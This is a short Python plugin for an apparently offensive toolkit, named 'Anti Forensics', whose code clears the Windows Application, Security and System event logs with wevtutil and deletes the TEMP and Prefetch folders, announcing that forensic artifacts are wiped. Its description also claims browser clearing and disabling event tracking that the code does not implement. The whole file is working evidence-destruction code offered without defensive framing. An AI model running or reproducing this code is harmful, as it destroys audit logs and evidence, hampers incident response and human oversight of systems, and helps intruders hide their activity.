from core.plugin_base import PluginBase
import os
import shutil

class AntiForensicsPlugin(PluginBase):
    @property
    def name(self): return "Anti Forensics"
    @property
    def description(self): return "Erases logs, clears browser/cache, disables Windows event tracking, and wipes temporary files."

    def run(self, method="full", **kwargs):
        try:
            if method == "full":
                # Clear Event Logs
                os.system("wevtutil cl Application")
                os.system("wevtutil cl Security")
                os.system("wevtutil cl System")
                # Clear temp folders
                temp_dir = os.getenv('TEMP', '/tmp')
                shutil.rmtree(temp_dir, ignore_errors=True)
                os.makedirs(temp_dir, exist_ok=True)
                # Clear prefetch
                prefetch = os.path.join(os.environ.get('SystemRoot', 'C:\\Windows'), 'Prefetch')
                shutil.rmtree(prefetch, ignore_errors=True)
                os.makedirs(prefetch, exist_ok=True)
                return "All major forensic artifacts wiped."
            elif method == "eventlogs":
                os.system("wevtutil cl Application")
                os.system("wevtutil cl Security")
                os.system("wevtutil cl System")
                return "Event logs cleared."
            else:
                return f"Unknown method: {method}"
        except Exception as e:
            return f"Anti-forensics failed: {e}"

def get_plugin():
    return AntiForensicsPlugin()
